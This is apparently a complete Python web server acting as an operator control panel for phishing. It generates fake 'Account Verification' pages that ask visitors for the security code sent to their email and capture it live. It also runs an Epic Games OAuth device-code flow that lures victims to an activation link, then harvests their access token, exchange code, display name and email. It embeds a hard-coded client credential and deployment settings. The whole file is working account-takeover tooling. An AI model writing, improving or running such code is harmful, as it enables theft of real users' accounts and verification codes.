import webbrowser
import http.server
import socketserver
import threading
import urllib.parse
import json
from datetime import datetime
import uuid
import time
import socket
import os
import signal
import sys
import re
import asyncio
import aiohttp

class ControlPanelHandler(http.server.SimpleHTTPRequestHandler):
    # Class-level variables to share data across all requests
    captured_codes = []
    active_forms = {}
    pending_verifications = {}
    epic_accounts = {}
    epic_device_sessions = {}

    def do_POST(self):
        endpoints = {
            '/generate-link': self.handle_generate_link,
            '/generate-epic-link': self.handle_generate_epic_link,
            '/clear-codes': self.handle_clear_codes,
            '/clear-epic-accounts': self.handle_clear_epic_accounts
        }
        
        # Handle paths that end with a unique ID
        path_without_id = '/'.join(self.path.split('/')[:-1]) + '/'
        
        if self.path in endpoints:
            endpoints[self.path]()
        elif path_without_id in ('/submit-code/', '/verify-code/', '/regenerate-exchange/'):
            if path_without_id == '/submit-code/': self.handle_code_submission()
            elif path_without_id == '/verify-code/': self.handle_code_verification()
            elif path_without_id == '/regenerate-exchange/': self.handle_regenerate_exchange()
        else:
            self.send_error(404)

    def do_GET(self):
        api_endpoints = {
            '/api/codes': lambda: self.send_json_response({'codes': self.captured_codes}),
            '/api/forms': lambda: self.send_json_response({'forms': list(self.active_forms.keys())}),
            '/api/pending': lambda: self.send_json_response({'pending': self.pending_verifications}),
            '/api/epic-accounts': lambda: self.send_json_response({'accounts': list(self.epic_accounts.values())}),
            '/api/epic-sessions': self.handle_get_epic_sessions
        }

        path_without_id = '/'.join(self.path.split('/')[:-1]) + '/'

        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(control_panel_html.encode())
        elif self.path in api_endpoints:
            api_endpoints[self.path]()
        elif path_without_id in ('/form/', '/check-verification/'):
            if path_without_id == '/form/': self.handle_form_page()
            elif path_without_id == '/check-verification/': self.handle_check_verification()
        else:
            self.send_error(404)

    def handle_get_epic_sessions(self):
        sessions = {
            session_id: {
                'session_id': session_id,
                'user_code': data.get('user_code', ''),
                'status': data.get('status', 'pending'),
                'activation_link': data.get('activation_link', ''),
                'created': data.get('created', ''),
                'expires': data.get('expires', ''),
                'account_id': data.get('account_id', '')
            } for session_id, data in self.epic_device_sessions.items()
        }
        self.send_json_response({'sessions': list(sessions.values())})

    def handle_generate_link(self):
        form_id = str(uuid.uuid4())[:8]
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.active_forms[form_id] = {'created': timestamp, 'accessed': False, 'codes_captured': 0}
        
        host = self.headers.get('Host', f'localhost:{self.server.server_address[1]}')
        scheme = 'https' if 'onrender.com' in host or ':' not in host else 'http'
        form_url = f"{scheme}://{host}/form/{form_id}"

        self.send_json_response({
            'success': True, 'form_id': form_id, 'url': form_url, 
            'created': timestamp, 'tunnel_status': "Live Server"
        })

    def handle_generate_epic_link(self):
        session_id = str(uuid.uuid4())[:8]
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        epic_thread = threading.Thread(
            target=self.run_epic_device_auth, args=(session_id, timestamp), daemon=True
        )
        epic_thread.start()
        self.send_json_response({'success': True, 'session_id': session_id, 'created': timestamp})

    def run_epic_device_auth(self, session_id, timestamp):
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(self.epic_device_auth_flow(session_id, timestamp))
        except Exception as e:
            print(f"❌ Epic auth error for session {session_id}: {e}")
            if session_id in self.epic_device_sessions:
                self.epic_device_sessions[session_id]['status'] = 'error'

    async def epic_device_auth_flow(self, session_id, timestamp):
        self.epic_device_sessions[session_id] = {'created': timestamp, 'status': 'initializing'}
        async with aiohttp.ClientSession() as sess:
            # Combined API calls for clarity
            async def get_api_token(grant_type, authorization, **kwargs):
                headers = {"Authorization": f"basic {authorization}", "Content-Type": "application/x-www-form-urlencoded"}
                data = {"grant_type": grant_type, **kwargs}
                async with sess.post("https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token", headers=headers, data=data) as r:
                    if r.status == 200: return (await r.json()).get("access_token")

            svc_token = await get_api_token("client_credentials", "OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3")
            if not svc_token: self.epic_device_sessions[session_id]['status'] = 'error'; return

            headers_bearer = {"Authorization": f"bearer {svc_token}", "Content-Type": "application/x-www-form-urlencoded"}
            async with sess.post("https://account-public-service-prod.ol.epicgames.com/account/api/oauth/deviceAuthorization", headers=headers_bearer) as r:
                if r.status != 200: self.epic_device_sessions[session_id]['status'] = 'error'; return
                dev_auth = await r.json()

            user_code, device_code = dev_auth["user_code"], dev_auth["device_code"]
            activation_link = f"https://www.epicgames.com/id/activate?userCode={user_code}"
            
            self.epic_device_sessions[session_id].update({'status': 'pending', 'user_code': user_code, 'activation_link': activation_link})
            print(f"🎮 Epic session started. Link: {activation_link}")

            deadline = time.time() + 600
            access_token = None
            while time.time() < deadline:
                await asyncio.sleep(5)
                token = await get_api_token("device_code", "OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3", device_code=device_code)
                if token: access_token = token; break
            
            if not access_token: self.epic_device_sessions[session_id]['status'] = 'expired'; return

            headers_bearer_user = {"Authorization": f"bearer {access_token}"}
            async with sess.get("https://account-public-service-prod.ol.epicgames.com/account/api/oauth/exchange", headers=headers_bearer_user) as r:
                if r.status != 200: self.epic_device_sessions[session_id]['status'] = 'error'; return
                exch_code = (await r.json()).get("code")

            async with sess.get("https://account-public-service-prod.ol.epicgames.com/account/api/public/account/me", headers=headers_bearer_user) as r:
                if r.status != 200: self.epic_device_sessions[session_id]['status'] = 'error'; return
                account_info = await r.json()
            
            account_id, display_name = account_info.get('id'), account_info.get('displayName')
            self.epic_accounts[account_id] = {
                'id': account_id, 'display_name': display_name, 'email': account_info.get('email', 'N/A'),
                'created': timestamp, 'current_exchange_code': exch_code
            }
            self.epic_device_sessions[session_id].update({'status': 'verified', 'account_id': account_id})
            print(f"✅ Epic Account Verified: {display_name}")

    def handle_regenerate_exchange(self):
        self.handle_generate_epic_link()

    def handle_form_page(self):
        form_id = self.path.split('/')[-1]
        if form_id in self.active_forms:
            self.send_response(200); self.send_header('Content-type', 'text/html'); self.end_headers()
            self.wfile.write(verification_form_html.replace('FORM_ID_PLACEHOLDER', form_id).encode())
        else: self.send_error(404, "Form not found")

    def handle_code_submission(self):
        form_id = self.path.split('/')[-1]
        if form_id not in self.active_forms: self.send_error(400, "Invalid form"); return
        
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        code = urllib.parse.parse_qs(post_data).get('code', [''])[0]
        verification_id = str(uuid.uuid4())[:8]

        self.pending_verifications[verification_id] = {'code': code, 'status': 'pending'}
        self.captured_codes.append({
            'code': code, 'timestamp': datetime.now().strftime("%H:%M:%S"), 
            'verification_id': verification_id, 'status': 'pending'
        })
        print(f"🔐 Code captured: {code}")
        self.send_json_response({'status': 'success', 'verification_id': verification_id})

    def handle_code_verification(self):
        verification_id = self.path.split('/')[-1]
        if verification_id not in self.pending_verifications: self.send_error(400, "Invalid ID"); return
        
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        is_correct = urllib.parse.parse_qs(post_data).get('correct', ['false'])[0] == 'true'
        
        status = 'correct' if is_correct else 'incorrect'
        self.pending_verifications[verification_id]['status'] = status
        for entry in self.captured_codes:
            if entry.get('verification_id') == verification_id: entry['status'] = status; break
        self.send_json_response({'status': 'success'})

    def handle_check_verification(self):
        verification_id = self.path.split('/')[-1]
        self.send_json_response(self.pending_verifications.get(verification_id, {'status': 'not_found'}))

    def handle_clear_codes(self):
        self.captured_codes.clear(); self.active_forms.clear(); self.pending_verifications.clear()
        self.send_json_response({'success': True})

    def handle_clear_epic_accounts(self):
        self.epic_accounts.clear(); self.epic_device_sessions.clear()
        self.send_json_response({'success': True})

    def send_json_response(self, data):
        self.send_response(200); self.send_header('Content-type', 'application/json'); self.end_headers()
        self.wfile.write(json.dumps(data).encode())

    def log_message(self, format, *args): pass # Suppress logs for cleaner output

def signal_handler(signum, frame):
    print("\n🛑 Shutting down server...")
    sys.exit(0)

control_panel_html = r'''
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Control Panel</title><style>@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');:root{--bg:#0a0a0a;--card:#18181c;--border:#2a2a2e;--text:#f0f0f0;--text-dim:#888;--accent:#0078f2;--green:#10b981;--red:#ef4444;--yellow:#fbbf24}*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);padding:20px;font-size:14px}.container{max-width:1200px;margin:0 auto;display:grid;grid-template-columns:repeat(auto-fit,minmax(350px,1fr));gap:20px}.card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:20px}.card-title{font-size:1.25rem;font-weight:600;margin-bottom:15px;border-bottom:1px solid var(--border);padding-bottom:10px}.btn{padding:10px 15px;border:none;border-radius:8px;font-weight:500;cursor:pointer;transition:background .2s;display:block;width:100%;text-align:center}.btn:hover{filter:brightness(1.2)}.btn-primary{background:var(--accent);color:white}.btn-danger{background:var(--red);color:white;margin-top:10px}.item-list{max-height:400px;overflow-y:auto;display:flex;flex-direction:column;gap:10px;padding-right:5px}.item{background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:15px}.item-header{display:flex;justify-content:space-between;align-items:center}.item-code{font-family:monospace;font-size:1.5rem;font-weight:600}.item-meta{color:var(--text-dim);font-size:.8rem}.status-badge{padding:3px 8px;border-radius:20px;font-size:.7rem;font-weight:600;text-transform:uppercase}.status-pending{background:var(--yellow);color:#000}.status-correct,.status-verified{background:var(--green);color:#fff}.status-incorrect,.status-expired,.status-error{background:var(--red);color:#fff}.actions{display:flex;gap:5px;margin-top:10px}.link-output{background:var(--bg);padding:10px;border-radius:8px;word-break:break-all;margin-top:10px;font-family:monospace}a{color:var(--accent);text-decoration:none}a:hover{text-decoration:underline}</style></head><body><div class="container"><div class="card"><h2 class="card-title">🔗 Verification Forms</h2><button class="btn btn-primary" id="generate-link-btn">✨ Generate New Form</button><div class="link-output" id="link-output" style="display:none"></div><button class="btn btn-danger" id="clear-codes-btn">🗑️ Clear All Codes</button></div><div class="card"><h2 class="card-title">🎮 Epic Games</h2><button class="btn btn-primary" id="generate-epic-btn">🎮 New Device Auth</button><button class="btn btn-danger" id="clear-epic-btn">🗑️ Clear All Accounts</button></div><div class="card"><h2 class="card-title">📋 Captured Codes</h2><div class="item-list" id="codes-container"><p>No codes yet.</p></div></div><div class="card"><h2 class="card-title">🧑 Epic Accounts & Sessions</h2><div class="item-list" id="epic-container"><p>No accounts or sessions yet.</p></div></div></div><script>const linkOutput=document.getElementById("link-output"),codesContainer=document.getElementById("codes-container"),epicContainer=document.getElementById("epic-container");document.getElementById("generate-link-btn").addEventListener("click",async()=>{const e=await fetch("/generate-link",{method:"POST"}),t=await e.json();t.success&&(linkOutput.innerHTML=`New Link: <a href="${t.url}" target="_blank">${t.url}</a>`,linkOutput.style.display="block")}),document.getElementById("generate-epic-btn").addEventListener("click",()=>fetch("/generate-epic-link",{method:"POST"})),document.getElementById("clear-codes-btn").addEventListener("click",()=>fetch("/clear-codes",{method:"POST"})),document.getElementById("clear-epic-btn").addEventListener("click",()=>fetch("/clear-epic-accounts",{method:"POST"}));async function verifyCode(e,t){await fetch(`/verify-code/${e}`,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:`correct=${t}`})}function updateUI(e){codesContainer.innerHTML=e.codes.length>0?e.codes.slice().reverse().map(e=>`\n                    <div class="item">\n                        <div class="item-header">\n                            <span class="item-code">${e.code}</span>\n                            <span class="status-badge status-${e.status}">${e.status}</span>\n                        </div>\n                        <div class="item-meta">${e.timestamp}</div>\n                        ${"pending"===e.status?`<div class="actions">\n                            <button class="btn btn-primary" onclick="verifyCode('${e.verification_id}', true)">✅ Correct</button>\n                            <button class="btn btn-danger" onclick="verifyCode('${e.verification_id}', false)">❌ Incorrect</button>\n                        </div>`:""}\n                    </div>\n                `).join(""):`<p class="item-meta">No codes yet.</p>`;let t="";e.accounts.length>0&&(t+=e.accounts.map(e=>`\n                    <div class="item">\n                        <div class="item-header">\n                            <strong>${e.display_name}</strong>\n                            <span class="status-badge status-verified">Verified</span>\n                        </div>\n                        <div class="item-meta">${e.email}</div>\n                        <div class="item-meta">Exchange Code: ${e.current_exchange_code.substring(0,16)}...</div>\n                    </div>\n                `).join("")),e.sessions.length>0&&(t+=e.sessions.filter(e=>"verified"!==e.status).map(e=>`\n                    <div class="item">\n                         <div class="item-header">\n                            <span class="item-code">${e.user_code||"..."}</span>\n                            <span class="status-badge status-${e.status}">${e.status}</span>\n                        </div>\n                        <div class="item-meta">\n                            <a href="${e.activation_link}" target="_blank" rel="noopener noreferrer">Activation Link</a>\n                        </div>\n                    </div>\n                `).join("")),epicContainer.innerHTML=t||`<p class="item-meta">No accounts or sessions yet.</p>`}async function fetchData(){try{const[e,t,n]=await Promise.all([fetch("/api/codes"),fetch("/api/epic-accounts"),fetch("/api/epic-sessions")]),s={codes:(await e.json()).codes,accounts:(await t.json()).accounts,sessions:(await n.json()).sessions};updateUI(s)}catch(e){console.error("Failed to fetch data:",e)}}setInterval(fetchData,2e3),fetchData();</script></body></html>
'''

verification_form_html = r'''
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Account Verification</title><style>@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');:root{--bg:#0a0a0a;--card:#18181c;--border:#2a2a2e;--text:#f0f0f0;--text-dim:#888;--accent:#0078f2}body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);display:flex;justify-content:center;align-items:center;min-height:100vh}.container{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:30px;max-width:400px;width:100%;text-align:center}h1{font-size:1.5rem;margin-bottom:10px}p{color:var(--text-dim);margin-bottom:20px}input{width:100%;padding:12px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text);font-size:1.2rem;text-align:center;margin-bottom:20px}button{width:100%;padding:12px;border-radius:8px;border:none;background:var(--accent);color:#fff;font-size:1rem;font-weight:500;cursor:pointer}</style></head><body><div class="container" id="form-container"><h1>Verify Your Request</h1><p>Please enter the security code sent to your email to confirm your identity.</p><form id="code-form"><input type="text" id="code-input" placeholder="Enter 6-digit code" required><button type="submit">Submit</button></form></div><div class="container" id="message-container" style="display:none"><h1></h1><p></p></div><script>const formId='FORM_ID_PLACEHOLDER',form=document.getElementById("code-form"),codeInput=document.getElementById("code-input");form.addEventListener("submit",async e=>{e.preventDefault();const t=codeInput.value,n=await fetch(`/submit-code/${formId}`,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:`code=${encodeURIComponent(t)}`}),s=await n.json();"success"===s.status&&(document.getElementById("form-container").style.display="none",document.getElementById("message-container").style.display="block",document.querySelector("#message-container h1").textContent="Verifying...",document.querySelector("#message-container p").textContent="Please wait while we check your code.",pollVerification(s.verification_id))});async function pollVerification(e){const t=await fetch(`/check-verification/${e}`),n=await t.json();"pending"===n.status?setTimeout(()=>pollVerification(e),2e3):"correct"===n.status?(document.querySelector("#message-container h1").textContent="✅ Success!",document.querySelector("#message-container p").textContent="Your request has been verified. You may now close this window."):(document.querySelector("#message-container h1").textContent="❌ Error",document.querySelector("#message-container p").textContent="The code provided was incorrect. Please try again.")}</script></body></html>
'''

# --- Main Execution ---
def main():
    # Set up signal handling for graceful shutdown
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    # **FIX:** Use Render's PORT environment variable. Default to 8080 for local use.
    port = int(os.environ.get('PORT', 8080))
    
    print(f"🚀 Starting Control Panel on port {port}...")
    
    # Open the local browser only if not in a server environment (like Render)
    if 'PORT' not in os.environ:
        webbrowser.open(f'http://localhost:{port}')

    with socketserver.TCPServer(("0.0.0.0", port), ControlPanelHandler) as httpd:
        print(f"✅ Server is live and listening on http://0.0.0.0:{port}")
        httpd.serve_forever()

if __name__ == "__main__":
    main()

